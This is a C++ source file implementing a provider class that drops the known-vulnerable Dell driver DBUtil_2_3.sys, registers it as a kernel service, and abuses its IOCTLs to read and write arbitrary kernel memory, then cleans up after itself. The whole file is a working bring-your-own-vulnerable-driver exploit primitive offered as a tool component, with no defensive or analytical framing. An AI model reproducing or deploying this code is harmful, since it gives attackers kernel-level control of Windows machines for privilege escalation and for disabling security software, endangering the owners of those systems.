/**
 * @file DBUtilProvider.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the implementation of the DBUtilProvider class.
 *
 * Implements the full lifecycle of the DBUtil_2_3.sys provider, including
 * dropping the driver, creating the service, performing kernel memory
 * operations via its specific IOCTLs, and cleaning up resources.
 */

#include "DBUtilProvider.h"
#include "../Utils.h"
#include <iostream>
#include <fstream>
#include <vector>

// IOCTLs for the vulnerability in DBUtil_2_3.sys
#define IOCTL_DBUTIL_READ  0x9B0C1EC4
#define IOCTL_DBUTIL_WRITE 0x9B0C1EC8

namespace KernelMode {
    namespace Providers {

        DBUtilProvider::DBUtilProvider() : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr) {}

        DBUtilProvider::~DBUtilProvider() {
            Deinitialize();
        }

        bool DBUtilProvider::DropDriver() {
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            this->driverPath = std::wstring(tempPath) + this->driverFileName;

            std::ifstream src(this->driverFileName, std::ios::binary);
            if (!src) {
                std::wcerr << L"[-] " << this->driverFileName << L" not found in the current directory." << std::endl;
                std::wcerr << L"[-] Please place " << this->driverFileName << L" next to the executable." << std::endl;
                return false;
            }
            src.close();

            if (!CopyFileW(this->driverFileName.c_str(), this->driverPath.c_str(), FALSE)) {
                if (GetLastError() != ERROR_FILE_EXISTS) {
                    std::wcerr << L"[-] Failed to copy driver to temporary path: " << GetLastError() << std::endl;
                    return false;
                }
            }
            
            std::wcout << L"[+] Driver placed at: " << this->driverPath << std::endl;
            return true;
        }

        bool DBUtilProvider::Initialize() {
            if (!DropDriver()) {
                return false;
            }

            this->serviceHandle = Utils::CreateDriverService(this->serviceName, this->driverPath);
            if (!this->serviceHandle) {
                std::wcerr << L"[-] Failed to create or start the DBUtil_2_3 service." << std::endl;
                DeleteFileW(this->driverPath.c_str());
                return false;
            }

            this->deviceHandle = CreateFileW(
                this->deviceName.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                0,
                nullptr
            );

            if (this->deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Failed to open a handle to the DBUtil_2_3 device: " << GetLastError() << std::endl;
                Deinitialize();
                return false;
            }

            std::wcout << L"[+] DBUtilProvider initialized successfully." << std::endl;
            return true;
        }

        void DBUtilProvider::Deinitialize() {
            if (this->deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(this->deviceHandle);
                this->deviceHandle = INVALID_HANDLE_VALUE;
            }
            if (this->serviceHandle) {
                Utils::RemoveDriverService(this->serviceHandle);
                this->serviceHandle = nullptr;
            }
            if (!this->driverPath.empty()) {
                DeleteFileW(this->driverPath.c_str());
                this->driverPath.clear();
            }
            std::wcout << L"[+] DBUtilProvider deinitialized." << std::endl;
        }

        bool DBUtilProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) return false;

            auto outBuffer = static_cast<BYTE*>(buffer);
            for (size_t i = 0; i < size; i += 4) {
                DBUtilMemoryRead request{};
                request.Address = address + i;
                
                DWORD bytesReturned = 0;
                if (!DeviceIoControl(this->deviceHandle, IOCTL_DBUTIL_READ, &request, sizeof(request), &request, sizeof(request), &bytesReturned, nullptr)) {
                    return false;
                }
                
                size_t copySize = min(4, size - i);
                memcpy(outBuffer + i, &request.Value, copySize);
            }
            return true;
        }

        bool DBUtilProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (this->deviceHandle == INVALID_HANDLE_VALUE) return false;

            auto inBuffer = static_cast<BYTE*>(buffer);
            for (size_t i = 0; i < size; ++i) {
                std::vector<char> requestBuffer(sizeof(DBUtilMemoryWrite) + 1);
                auto request = reinterpret_cast<DBUtilMemoryWrite*>(requestBuffer.data());
                
                request->Address = address + i;
                request->Offset = 0; // Not used for this operation
                request->Value[0] = inBuffer[i];

                DWORD bytesReturned = 0;
                if (!DeviceIoControl(this->deviceHandle, IOCTL_DBUTIL_WRITE, request, sizeof(DBUtilMemoryWrite), nullptr, 0, &bytesReturned, nullptr)) {
                    return false;
                }
            }
            return true;
        }
    }
}